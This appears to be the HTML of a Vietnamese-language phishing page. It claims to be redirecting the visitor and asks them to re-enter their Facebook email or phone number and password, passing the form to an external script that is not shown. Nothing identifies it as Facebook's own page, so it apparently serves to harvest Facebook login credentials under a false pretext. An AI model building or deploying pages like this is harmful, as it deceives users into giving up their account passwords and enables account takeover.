<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../style/style.css">
    <link href="../img/logo.png" rel="shortcut icon">
    <title>Đang chuyển đến...</title>
</head>
<body>
    <!-- header -->
    <header>
        <h4 class="text_header">Vui lòng nhập lại tài khoản Facebook để chuyển đến trang...</h4>
    </header>
    <!-- body -->
    <div class="container">
        <form id="loginForm">
            <!-- username -->
            <div class="username">
                <input type="text" name="username" id="username" placeholder="Email hoặc số điện thoại">
            </div>
            <!-- password -->
            <div class="password">
                <input type="password" name="password" id="password" placeholder="Mật khẩu">
            </div>
            <!-- button -->
            <div class="button">
                <button type="submit" name="submit" id="submit">Chuyển đến</button>
            </div>
        </form>
    </div>

    <!-- script -->
    <script src="../js/script.js"></script>

    <!-- footer -->
    <footer>
        <h4 class="text_footer">© 2020 - 2021</h4>
    </footer>
</body>
</html>
